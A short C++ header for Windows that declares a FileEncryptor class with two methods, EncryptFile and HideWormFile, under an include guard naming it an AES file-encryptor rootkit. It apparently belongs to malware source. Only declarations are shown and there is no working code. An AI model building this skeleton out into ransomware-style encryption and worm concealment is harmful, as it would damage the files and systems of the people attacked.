#ifndef AES_FILE_ENCRYPTOR_ROOTKIT_H
#define AES_FILE_ENCRYPTOR_ROOTKIT_H

#include <iostream>
#include <vector>
#include <filesystem>
#include <Windows.h>

namespace fs = std::filesystem;

class FileEncryptor {
public:
    static void EncryptFile(const std::string& filePath);
    static void HideWormFile(const std::string& wormPath);
};

#endif // AES_FILE_ENCRYPTOR_ROOTKIT_H
